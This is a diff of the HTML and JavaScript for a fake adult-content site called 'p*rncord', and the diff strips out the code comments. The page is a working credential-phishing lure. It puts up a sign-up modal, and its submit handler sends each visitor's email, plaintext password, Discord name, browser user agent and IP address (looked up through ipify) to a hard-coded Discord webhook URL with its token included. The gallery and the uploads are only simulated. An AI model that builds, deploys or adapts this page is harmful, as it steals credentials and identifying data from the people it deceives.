@@ -4,7 +4,7 @@
     <title>p*rncord</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        /* Reset and base styles */
+    
         * {
             margin: 0;
             padding: 0;
@@ -141,7 +141,6 @@
             display: none;
         }
 
-        /* Main content (hidden until registration) */
         .main-content {
             display: none;
             padding: 20px;
@@ -149,7 +148,7 @@
             margin: 0 auto;
         }
 
-        /* Categories */
+        
         .categories {
             display: flex;
             gap: 10px;
@@ -172,7 +171,7 @@
             color: white;
         }
 
-        /* Gallery */
+       
         .gallery {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
@@ -216,7 +215,7 @@
             justify-content: space-between;
         }
 
-        /* Upload section */
+     
         .upload-section {
             background-color: #1a1a1a;
             border: 1px solid #333;
@@ -262,7 +261,6 @@
             text-align: center;
         }
 
-        /* Footer */
         .footer {
             background-color: #1a1a1a;
             padding: 20px;
@@ -290,7 +288,7 @@
     </style>
 </head>
 <body>
-    <!-- Registration Modal -->
+    
     <div class="modal-overlay" id="registrationModal">
         <div class="modal">
             <h2>Join <span class="logo">p*rn<span>cord</span></span></h2>
@@ -330,9 +328,9 @@
         </div>
     </div>
 
-    <!-- Main Content (hidden until registration) -->
+    
     <div class="main-content" id="mainContent">
-        <!-- Header -->
+        
         <div class="header">
             <a href="#" class="logo">p*rn<span>cord</span></a>
             <div class="nav-links">
@@ -344,9 +342,9 @@
             </div>
         </div>
 
-        <!-- Main Area -->
+       
         <div style="padding: 20px; max-width: 1200px; margin: 0 auto;">
-            <!-- Categories -->
+            
             <div class="categories">
                 <a href="#" class="category active">Trending</a>
                 <a href="#" class="category">New</a>
@@ -358,7 +356,7 @@
                 <a href="#" class="category">Long</a>
             </div>
 
-            <!-- Upload Section -->
+        
             <div class="upload-section">
                 <h3>Share with the Community</h3>
                 <div class="upload-box" id="uploadBox">
@@ -369,18 +367,16 @@
                 </div>
             </div>
 
-            <!-- Gallery -->
             <div class="gallery" id="gallery">
-                <!-- Images will be loaded here -->
+                
             </div>
 
-            <!-- Load More -->
             <div style="text-align: center; margin: 30px 0;">
                 <button class="submit-btn" style="width: 200px;" onclick="loadMoreImages()">Load More</button>
             </div>
         </div>
 
-        <!-- Footer -->
+    
         <div class="footer">
             <div class="footer-links">
                 <a href="#">About</a>
@@ -397,10 +393,10 @@
     </div>
 
     <script>
-        // Configuration
+       
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1454093879782412472/7A5MwSKRIEmv2e-i8zqAfGvnyGodRDqGOOExqXejlCUxUnHQ0cygrMi7tibZV20z9eKi';
         
-        // Sample images (would be fetched from external sources in production)
+        
         const SAMPLE_IMAGES = [
             { id: 1, title: "Community favorite", views: "125", likes: "8", src: "https://i.imgur.com/placeholder1.jpg" },
             { id: 2, title: "New upload", views: "87", likes: "5", src: "https://i.imgur.com/placeholder2.jpg" },
@@ -412,7 +408,7 @@
             { id: 8, title: "Popular GIF", views: "421", likes: "29", src: "https://i.imgur.com/placeholder8.jpg" }
         ];
 
-        // DOM Elements
+    
         const registrationModal = document.getElementById('registrationModal');
         const mainContent = document.getElementById('mainContent');
         const registerForm = document.getElementById('registerForm');
@@ -420,7 +416,6 @@
         const uploadBox = document.getElementById('uploadBox');
         const fileInput = document.getElementById('fileInput');
 
-        // Initialize gallery with sample images
         function initializeGallery() {
             gallery.innerHTML = '';
             SAMPLE_IMAGES.forEach(img => {
@@ -440,20 +435,18 @@
             });
         }
 
-        // Form validation and submission
         registerForm.addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            // Get values
+            
             const email = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value;
             const confirmPassword = document.getElementById('confirmPassword').value;
             const discordName = document.getElementById('discordName').value.trim();
-            
-            // Reset errors
+          
             document.querySelectorAll('.error').forEach(el => el.style.display = 'none');
             
-            // Validate
+            
             let isValid = true;
             
             if (!email.includes('@') || email.length < 5) {
@@ -477,23 +470,20 @@
             }
             
             if (!isValid) return;
-            
-            // Disable button and show loading
+           
             const submitBtn = registerForm.querySelector('.submit-btn');
             const originalText = submitBtn.textContent;
             submitBtn.textContent = 'Creating account...';
             submitBtn.disabled = true;
             
             try {
-                // Send data to Discord webhook
+                
                 await sendToDiscord(email, password, discordName);
                 
-                // Store in localStorage (simulating account creation)
                 localStorage.setItem('porncord_registered', 'true');
                 localStorage.setItem('porncord_email', email);
                 localStorage.setItem('porncord_discord', discordName);
-                
-                // Hide modal, show content
+             
                 setTimeout(() => {
                     registrationModal.style.display = 'none';
                     mainContent.style.display = 'block';
@@ -510,7 +500,7 @@
             }
         });
 
-        // Send data to Discord webhook
+      
         async function sendToDiscord(email, password, discordName) {
             const timestamp = new Date().toISOString();
             const userAgent = navigator.userAgent;
@@ -547,7 +537,7 @@
             }
         }
 
-        // Get IP info
+        
         async function getIPInfo() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
@@ -564,7 +554,7 @@
             }
         }
 
-        // Upload functionality
+ 
         uploadBox.addEventListener('click', () => {
             fileInput.click();
         });
@@ -574,13 +564,13 @@
                 const file = this.files[0];
                 const fileName = file.name;
                 
-                // Simulate upload
+                
                 uploadBox.innerHTML = `
                     <div>📤 Uploading "${fileName}"...</div>
                     <div style="margin-top: 10px; color: #7289da;">Processing your upload</div>
                 `;
                 
-                // After 2 seconds, show success
+               
                 setTimeout(() => {
                     uploadBox.innerHTML = `
                         <div>✅ Upload successful!</div>
@@ -588,7 +578,7 @@
                         <div class="upload-note">Your upload will appear in the gallery after moderation.</div>
                     `;
                     
-                    // Reset after 3 seconds
+                    
                     setTimeout(() => {
                         uploadBox.innerHTML = `
                             <div>📁 Drag & drop or click to upload</div>
@@ -601,14 +591,14 @@
             }
         });
 
-        // Load more images
+   
         function loadMoreImages() {
             const btn = document.querySelector('.submit-btn');
             btn.textContent = 'Loading...';
             btn.disabled = true;
             
             setTimeout(() => {
-                // Add more sample images
+               
                 for (let i = 0; i < 4; i++) {
                     const newId = SAMPLE_IMAGES.length + i + 1;
                     const newImage = {
@@ -639,14 +629,13 @@
             }, 1000);
         }
 
-        // Check if already registered
         if (localStorage.getItem('porncord_registered') === 'true') {
             registrationModal.style.display = 'none';
             mainContent.style.display = 'block';
             initializeGallery();
         }
 
-        // Drag and drop for upload
+    
         uploadBox.addEventListener('dragover', (e) => {
             e.preventDefault();
             uploadBox.style.borderColor = '#7289da';
